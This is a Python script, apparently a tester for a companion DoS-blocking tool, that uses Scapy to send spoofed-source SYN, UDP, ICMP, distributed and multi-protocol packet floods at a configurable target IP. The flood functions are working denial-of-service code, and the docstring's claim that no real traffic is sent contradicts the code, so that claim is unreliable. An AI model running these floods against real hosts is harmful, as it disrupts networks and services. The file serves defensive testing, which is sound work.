"""
DoS Attack Tester & Simulator

This script simulates various DoS attack patterns to test the dos_blocker.
It creates synthetic packets without requiring root privileges or actual network traffic.
"""

import time
import random
import threading
from collections import defaultdict
from typing import DefaultDict, Set, Tuple
from scapy.all import IP, TCP, UDP, ICMP, Raw, send, conf


# Configuration
THRESHOLD = 100  # packets per second (from dos_blocker)
TIME_WINDOW = 10  # seconds (from dos_blocker)
TARGET_IP = "192.168.1.100"
TEST_DURATION = 5  # seconds for each test


class DoSSimulator:
    """Simulates different types of DoS attacks."""

    def __init__(self, target_ip: str = TARGET_IP, verbose: bool = True):
        self.target_ip = target_ip
        self.verbose = verbose
        conf.verb = 0  # Suppress Scapy's verbose output

    def _log(self, message: str) -> None:
        """Print log message if verbose mode is enabled."""
        if self.verbose:
            print(f"[TESTER] {message}")

    def _random_ip(self) -> str:
        """Generate a random IP address."""
        return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"

    def simple_flood(self, duration: int = TEST_DURATION, pps: int = 150) -> int:
        """
        Simulate a simple packet flood attack.
        
        Args:
            duration: How long to flood (seconds)
            pps: Packets per second to send
        
        Returns:
            Number of packets sent
        """
        self._log(f"Starting simple flood: {pps} pps for {duration}s")
        packet_count = 0
        interval = 1.0 / pps
        start = time.time()
        
        while time.time() - start < duration:
            attacker_ip = self._random_ip()
            packet = IP(src=attacker_ip, dst=self.target_ip) / TCP(dport=80, flags="S")
            try:
                send(packet, verbose=0)
                packet_count += 1
                time.sleep(interval)
            except Exception as e:
                self._log(f"Send error: {e}")
        
        self._log(f"Flood complete: sent {packet_count} packets")
        return packet_count

    def syn_flood(self, duration: int = TEST_DURATION, pps: int = 120) -> int:
        """
        Simulate a SYN flood attack (TCP SYN with random source IPs).
        
        Args:
            duration: How long to flood (seconds)
            pps: Packets per second to send
        
        Returns:
            Number of packets sent
        """
        self._log(f"Starting SYN flood: {pps} pps for {duration}s")
        packet_count = 0
        interval = 1.0 / pps
        start = time.time()
        
        while time.time() - start < duration:
            attacker_ip = self._random_ip()
            packet = IP(src=attacker_ip, dst=self.target_ip) / TCP(
                sport=random.randint(1024, 65535),
                dport=80,
                flags="S",
                seq=random.randint(0, 2**32 - 1)
            )
            try:
                send(packet, verbose=0)
                packet_count += 1
                time.sleep(interval)
            except Exception as e:
                self._log(f"Send error: {e}")
        
        self._log(f"SYN flood complete: sent {packet_count} packets")
        return packet_count

    def udp_flood(self, duration: int = TEST_DURATION, pps: int = 150) -> int:
        """
        Simulate a UDP flood attack.
        
        Args:
            duration: How long to flood (seconds)
            pps: Packets per second to send
        
        Returns:
            Number of packets sent
        """
        self._log(f"Starting UDP flood: {pps} pps for {duration}s")
        packet_count = 0
        interval = 1.0 / pps
        start = time.time()
        
        while time.time() - start < duration:
            attacker_ip = self._random_ip()
            packet = IP(src=attacker_ip, dst=self.target_ip) / UDP(
                sport=random.randint(1024, 65535),
                dport=53  # DNS
            ) / Raw(load=b"X" * random.randint(100, 500))
            try:
                send(packet, verbose=0)
                packet_count += 1
                time.sleep(interval)
            except Exception as e:
                self._log(f"Send error: {e}")
        
        self._log(f"UDP flood complete: sent {packet_count} packets")
        return packet_count

    def icmp_flood(self, duration: int = TEST_DURATION, pps: int = 120) -> int:
        """
        Simulate an ICMP ping flood attack.
        
        Args:
            duration: How long to flood (seconds)
            pps: Packets per second to send
        
        Returns:
            Number of packets sent
        """
        self._log(f"Starting ICMP flood: {pps} pps for {duration}s")
        packet_count = 0
        interval = 1.0 / pps
        start = time.time()
        
        while time.time() - start < duration:
            attacker_ip = self._random_ip()
            packet = IP(src=attacker_ip, dst=self.target_ip) / ICMP()
            try:
                send(packet, verbose=0)
                packet_count += 1
                time.sleep(interval)
            except Exception as e:
                self._log(f"Send error: {e}")
        
        self._log(f"ICMP flood complete: sent {packet_count} packets")
        return packet_count

    def distributed_attack(self, num_attackers: int = 10, duration: int = TEST_DURATION) -> int:
        """
        Simulate a distributed attack from multiple source IPs.
        
        Args:
            num_attackers: Number of different attacker IPs
            duration: How long to attack (seconds)
        
        Returns:
            Number of packets sent
        """
        self._log(f"Starting distributed attack from {num_attackers} sources for {duration}s")
        attacker_ips = [f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}" for _ in range(num_attackers)]
        packet_count = 0
        pps_per_attacker = 80  # Total will be ~800 pps
        interval = 1.0 / (pps_per_attacker * num_attackers)
        start = time.time()
        
        while time.time() - start < duration:
            for src_ip in attacker_ips:
                packet = IP(src=src_ip, dst=self.target_ip) / TCP(dport=80, flags="S")
                try:
                    send(packet, verbose=0)
                    packet_count += 1
                except Exception as e:
                    self._log(f"Send error: {e}")
            time.sleep(interval)
        
        self._log(f"Distributed attack complete: sent {packet_count} packets from {num_attackers} sources")
        return packet_count


class DoSDetectionTester:
    """Tests the detection logic without actual packet sniffing."""

    def __init__(self, threshold: int = THRESHOLD, time_window: int = TIME_WINDOW):
        self.threshold = threshold
        self.time_window = time_window
        self.packet_counts: DefaultDict[str, int] = defaultdict(int)
        self.blocked_ips: Set[str] = set()
        self.start_time: float = time.time()

    def process_packet(self, src_ip: str) -> Tuple[bool, str]:
        """
        Simulate packet processing logic from dos_blocker.
        
        Returns:
            (is_attack_detected, reason)
        """
        self.packet_counts[src_ip] += 1
        current_time = time.time()
        
        # Reset counters if time window expired
        if current_time - self.start_time > self.time_window:
            self.packet_counts.clear()
            self.start_time = current_time
            self.packet_counts[src_ip] = 1
        
        # Check if threshold exceeded
        if self.packet_counts[src_ip] > self.threshold:
            if src_ip not in self.blocked_ips:
                self.blocked_ips.add(src_ip)
                return True, f"Threshold exceeded: {self.packet_counts[src_ip]} > {self.threshold}"
        
        return False, ""

    def test_detection(self, attacker_ips: list, packet_count: int) -> dict:
        """
        Test detection logic with simulated packets.
        
        Args:
            attacker_ips: List of source IPs to simulate
            packet_count: Total packets distributed across IPs
        
        Returns:
            Statistics dict
        """
        detected_ips = set()
        packets_per_ip = packet_count // len(attacker_ips)
        
        for src_ip in attacker_ips:
            for _ in range(packets_per_ip):
                is_detected, reason = self.process_packet(src_ip)
                if is_detected:
                    detected_ips.add(src_ip)
        
        return {
            "total_packets_processed": packet_count,
            "total_unique_ips": len(attacker_ips),
            "detected_attacks": len(detected_ips),
            "blocked_ips": list(self.blocked_ips),
            "detection_rate": len(detected_ips) / len(attacker_ips) * 100 if attacker_ips else 0
        }


def run_multi_protocol_attack(simulator: DoSSimulator) -> int:
    """Run simultaneous multi-protocol attack for maximum load."""
    print("[TESTER] Starting multi-protocol simultaneous attack...")
    total_packets = 0
    duration = 5
    interval = 0.001  # ~1000 pps total
    start = time.time()
    
    while time.time() - start < duration:
        # Mix different protocols in rapid succession
        attacker_ip = simulator._random_ip()
        
        # TCP SYN
        pkt1 = IP(src=attacker_ip, dst=simulator.target_ip) / TCP(dport=80, flags="S")
        # UDP
        pkt2 = IP(src=attacker_ip, dst=simulator.target_ip) / UDP(dport=53) / Raw(load=b"X"*200)
        # ICMP
        pkt3 = IP(src=attacker_ip, dst=simulator.target_ip) / ICMP()
        
        try:
            send(pkt1, verbose=0)
            send(pkt2, verbose=0)
            send(pkt3, verbose=0)
            total_packets += 3
        except Exception as e:
            print(f"[TESTER] Send error: {e}")
        
        time.sleep(interval)
    
    print(f"[TESTER] Multi-protocol attack complete: sent {total_packets} packets")
    return total_packets


def run_tests():
    """Run all DoS attack tests."""
    print("=" * 70)
    print("DoS ATTACK TESTER - Firewall Simulator")
    print("=" * 70)
    
    simulator = DoSSimulator(TARGET_IP, verbose=True)
    detector = DoSDetectionTester(THRESHOLD, TIME_WINDOW)
    
    tests = [
        ("Simple TCP Flood", lambda: simulator.simple_flood(duration=5, pps=300)),
        ("SYN Flood", lambda: simulator.syn_flood(duration=5, pps=250)),
        ("UDP Flood", lambda: simulator.udp_flood(duration=5, pps=350)),
        ("ICMP Ping Flood", lambda: simulator.icmp_flood(duration=5, pps=280)),
        ("Distributed Attack (20 sources)", lambda: simulator.distributed_attack(num_attackers=20, duration=5)),
        ("Intensive Multi-Protocol Attack", lambda: run_multi_protocol_attack(simulator)),
    ]
    
    print(f"\n[CONFIG] Target: {TARGET_IP}")
    print(f"[CONFIG] Detection Threshold: {THRESHOLD} packets/window")
    print(f"[CONFIG] Time Window: {TIME_WINDOW} seconds")
    print(f"[CONFIG] Each test duration: 5 seconds (increased from 3s)")
    print(f"[CONFIG] Packet rates: 250-350 pps per test (doubled from previous)")
    print(f"[CONFIG] Distributed attackers: 20 sources (doubled from 10)\n")
    
    for test_name, test_func in tests:
        print(f"\n--- Running: {test_name} ---")
        try:
            packet_count = test_func()
            print(f"✓ {test_name}: Sent {packet_count} packets")
        except PermissionError:
            print(f"✗ {test_name}: Requires root privileges (try: sudo python dos_tester.py)")
        except Exception as e:
            print(f"✗ {test_name}: {e}")
    
    print("\n" + "=" * 70)
    print("TEST SUMMARY")
    print("=" * 70)
    print("Tests completed. Run dos_blocker.py in another terminal to see detections.")
    print("Example: sudo python dos_blocker.py")
    print("=" * 70)


if __name__ == "__main__":
    run_tests()
